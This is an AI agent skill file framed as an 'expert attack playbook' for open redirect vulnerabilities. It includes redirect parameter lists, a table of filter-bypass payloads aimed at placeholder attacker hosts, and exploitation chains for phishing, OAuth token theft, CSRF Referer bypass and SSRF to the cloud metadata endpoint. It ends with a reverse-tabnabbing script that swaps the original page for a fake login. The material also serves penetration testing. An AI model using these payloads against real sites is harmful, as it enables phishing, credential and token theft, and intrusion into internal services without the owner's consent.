---
name: open-redirect
description: >-
  Open redirect playbook. Use when URL parameters, form actions, or JavaScript sinks control navigation targets and may redirect users to attacker-controlled destinations.
---

# SKILL: Open Redirect — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Open redirect techniques. Covers parameter-based redirects, JavaScript sinks, filter bypass, and chaining with phishing, CSRF Referer bypass, OAuth token theft, and SSRF. Often underrated but critical for phishing and as a building block in multi-step exploit chains.

## 1. CORE CONCEPT

Open redirect occurs when an application redirects users to a URL derived from user input without validation. The trusted domain acts as a "launchpad" for phishing or token theft.

```
https://trusted.com/redirect?url=https://evil.com
→ User sees trusted.com in the link → clicks → lands on evil.com
```

---

## 2. FINDING REDIRECT PARAMETERS

### Common Parameter Names

```text
?url=           ?redirect=      ?next=          ?dest=
?destination=   ?redir=         ?return=        ?returnUrl=
?go=            ?forward=       ?target=        ?out=
?continue=      ?link=          ?view=          ?to=
?ref=           ?callback=      ?path=          ?rurl=
```

### Server-Side Sinks

```
HTTP 301/302 Location header
PHP: header("Location: $input")
Python: redirect(input)
Java: response.sendRedirect(input)
Node: res.redirect(input)
```

### Client-Side (JavaScript) Sinks

```javascript
window.location = input
window.location.href = input
window.location.replace(input)
window.open(input)
document.location = input
```

---

## 3. FILTER BYPASS TECHNIQUES

| Validation | Bypass |
|---|---|
| Checks if URL starts with `/` | `//evil.com` (protocol-relative) |
| Checks domain contains `trusted.com` | `evil.com?trusted.com` or `trusted.com.evil.com` |
| Blocks `http://` | `//evil.com`, `https://evil.com`, `\/\/evil.com` |
| Checks URL starts with `https://trusted.com` | `https://trusted.com@evil.com` (userinfo) |
| Regex `^/[^/]` (relative only) | `/\evil.com` (backslash treated as path in some browsers) |
| Django `endswith('target.com')` | `http://evil.com/www.target.com` — URL path ends with target domain |
| Whitelist by domain suffix | Subdomain takeover on `*.trusted.com` |

```text
# Protocol-relative:
//evil.com

# Userinfo bypass:
https://trusted.com@evil.com

# Backslash trick:
/\evil.com
/\/evil.com

# URL encoding:
https://trusted.com/%2F%2Fevil.com

# Django endswith bypass:
http://evil.com/www.target.com
http://evil.com?target.com

# Trusted site double-redirect (e.g., via Baidu link service):
https://link.target.com/?url=http://evil.com

# Special character confusion:
http://evil.com#@trusted.com        # fragment as authority
http://evil.com?trusted.com         # query string confusion
http://trusted.com%00@evil.com      # null byte truncation

# Tab/newline in URL (browser ignores whitespace):
java%09script:alert(1)
```

---

## 4. EXPLOITATION CHAINS

### Phishing Amplification

Attacker sends: `https://bigbank.com/redirect?url=https://bigbank-login.evil.com`
Victim sees `bigbank.com` → clicks → enters credentials on clone site.

### OAuth Token Theft

If OAuth `redirect_uri` allows open redirect on the authorized domain:
```
/authorize?redirect_uri=https://trusted.com/redirect?url=https://evil.com
→ Authorization code or token appended to evil.com URL
→ Attacker captures token from URL fragment or query
```

### CSRF Referer Bypass

Some CSRF protections check `Referer` header contains trusted domain:
```
1. Attacker page links to: https://trusted.com/redirect?url=https://trusted.com/change-email
2. Redirect preserves Referer from trusted.com
3. CSRF protection passes because Referer = trusted.com
```

### SSRF via Redirect

When server follows redirects:
```
?url=https://attacker.com/redirect-to-internal
# attacker.com returns 302 → http://169.254.169.254/
# Server follows redirect → SSRF to metadata endpoint
```

---

## 5. TESTING CHECKLIST

```
□ Identify all URL parameters that trigger redirects
□ Test external domain: ?url=https://evil.com
□ Test protocol-relative: ?url=//evil.com
□ Test userinfo bypass: ?url=https://trusted.com@evil.com
□ Test backslash: ?url=/\evil.com
□ Test JavaScript sink: ?url=javascript:alert(1) (DOM-based)
□ Check OAuth flows for redirect_uri open redirect
□ Verify if redirect preserves auth tokens in URL
```

---

## 6. TABNABBING (REVERSE TABNABBING)

### Concept

When a link opens a new tab with `target="_blank"` WITHOUT `rel="noopener"`:

- The new page can access `window.opener`
- It can redirect the ORIGINAL page: `window.opener.location = "https://phishing.com/login"`
- User returns to "original" tab → sees fake login page → enters credentials

### Detection

```html
<!-- Vulnerable: -->
<a href="https://external.com" target="_blank">Click here</a>

<!-- Safe: -->
<a href="https://external.com" target="_blank" rel="noopener noreferrer">Click here</a>
```

### Exploitation

```javascript
// On the attacker-controlled page (opened via target="_blank"):
if (window.opener) {
    window.opener.location = "https://phishing.com/fake-login.html";
}
```

### Where to Look

- User-generated content with links (forums, comments, profiles)
- `target="_blank"` links to external domains
- PDF viewers, document previews opening in new tabs
